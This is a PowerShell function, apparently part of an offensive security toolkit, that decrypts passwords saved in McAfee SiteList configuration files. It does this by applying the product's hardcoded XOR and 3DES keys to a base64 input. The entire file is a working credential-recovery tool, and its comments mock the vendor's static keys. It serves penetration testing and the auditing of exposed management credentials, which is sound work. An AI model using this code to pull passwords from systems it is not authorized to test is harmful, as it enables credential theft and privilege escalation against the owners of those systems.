function Get-DecryptedSitelistPassword {
    # PowerShell adaptation of https://github.com/funoverip/mcafee-sitelist-pwd-decryption/
    # Original Author: Jerome Nokin (@funoverip / jerome.nokin@gmail.com)
    # port by @harmj0y
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        $B64Pass
    )

    # make sure the appropriate assemblies are loaded
    Add-Type -assembly System.Security
    Add-Type -assembly System.Core

    # declare the encoding/crypto providers we need
    $Encoding = [System.Text.Encoding]::ASCII
    $SHA1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider 
    $3DES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider

    # static McAfee key XOR key LOL
    $XORKey = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19

    # xor the input b64 string with the static XOR key
    $I = 0;
    $UnXored = [System.Convert]::FromBase64String($B64Pass) | Foreach-Object { $_ -BXor $XORKey[$I++ % $XORKey.Length] }

    # build the static McAfee 3DES key TROLOL
    $3DESKey = $SHA1.ComputeHash($Encoding.GetBytes('<!@#$%^>')) + ,0x00*4

    # set the options we need
    $3DES.Mode = 'ECB'
    $3DES.Padding = 'None'
    $3DES.IV = ,0x00*8
    $3DES.Key = $3DESKey

    # decrypt the unXor'ed block
    $Decrypted = $3DES.CreateDecryptor().TransformFinalBlock($UnXored, 0, $UnXored.Length)

    # ignore the padding for the result
    $Index = [Array]::IndexOf($Decrypted, [Byte]0)
    if($Index -ne -1) {
        $DecryptedPass = $Encoding.GetString($Decrypted[0..($Index-1)])
    }
    else {
        $DecryptedPass = $Encoding.GetString($Decrypted)
    }

    New-Object -TypeName PSObject -Property @{'Encrypted'=$B64Pass;'Decrypted'=$DecryptedPass}
}
